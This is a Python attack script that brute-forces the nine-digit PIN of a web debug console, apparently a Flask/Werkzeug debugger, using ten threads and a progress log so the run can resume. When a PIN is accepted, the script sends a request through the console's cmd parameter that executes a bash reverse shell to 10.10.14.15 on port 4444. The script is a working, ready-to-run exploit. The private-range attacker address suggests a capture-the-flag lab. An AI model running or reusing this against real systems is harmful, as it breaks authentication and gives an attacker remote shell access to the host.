import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

url = 'http://127.0.0.1:7777/console'
session = requests.Session()
MAX_THREADS = 10
PROGRESS_FILE = '/tmp/pinbuster-progress.log'

# ✨ Reverse shell payload
REVERSE_SHELL = "bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'"

def format_pin(pin):
    s = str(pin).rjust(9, '0')
    return '-'.join([s[i:i+3] for i in range(0, 9, 3)])

def try_pin(pin):
    formatted = format_pin(pin)
    try:
        # Write progress to log
        with open(PROGRESS_FILE, "a") as log:
            log.write(f"{pin}\n")

        # Submit PIN attempt
        resp = session.post(url, data={'pin': formatted}, timeout=3)

        if "Console Locked" not in resp.text:
            print(f"[+] SUCCESS! PIN is: {formatted}")
            return formatted
    except Exception as e:
        pass
    return None

def send_reverse_shell(pin):
    print(f"[+] Sending reverse shell using PIN: {pin}")
    payload = f"""__import__('os').system("{REVERSE_SHELL}")"""
    encoded = urllib.parse.quote(payload)
    shell_url = f"{url}?__debugger__=yes&cmd={encoded}&frm=0&s={pin}"
    try:
        session.get(shell_url, timeout=2)
    except:
        pass

def get_last_pin():
    if not os.path.exists(PROGRESS_FILE):
        return 100000000
    with open(PROGRESS_FILE, "r") as log:
        lines = log.readlines()
        if lines:
            return int(lines[-1].strip()) + 1
    return 100000000

def main():
    start_from = get_last_pin()
    end_at = 999999999
    print(f"[*] Resuming from PIN: {start_from}")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_pin = {
            executor.submit(try_pin, pin): pin
            for pin in range(start_from, end_at)
        }

        for future in as_completed(future_to_pin):
            result = future.result()
            if result:
                pin_raw = result.replace("-", "")
                send_reverse_shell(pin_raw)
                break

if __name__ == '__main__':
    main()
